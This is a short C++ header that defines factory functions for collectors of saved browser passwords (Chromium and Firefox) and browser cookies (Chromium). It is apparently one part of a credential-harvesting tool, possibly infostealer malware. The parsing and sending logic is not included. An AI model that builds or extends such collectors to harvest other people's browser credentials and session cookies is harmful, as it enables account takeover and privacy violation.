#pragma once
#include "ICollector.h"
#include "ChromeParser.h"
#include "FireFoxParser.h"
#include "ChromeCookiesParser.h"

namespace collector
{
	enum class BrowserType
	{
		None,
		Chromium = 32,
		Mozilla = 64,
	};

	inline ICollector<AccountData>* create_password_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
			case BrowserType::None: return nullptr;
			case BrowserType::Chromium: return new ChromiumParser();
			case BrowserType::Mozilla: return new FireFoxParser();
			default: return nullptr;;
		}
	}

	inline ICollector<CookieData>* create_cookies_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
		case BrowserType::None: return nullptr;
		case BrowserType::Chromium: return new ChromeCookiesParser();
		//case BrowserType::Mozilla: return new FireFoxParser();
		default: return nullptr;;
		}
	}


	
}
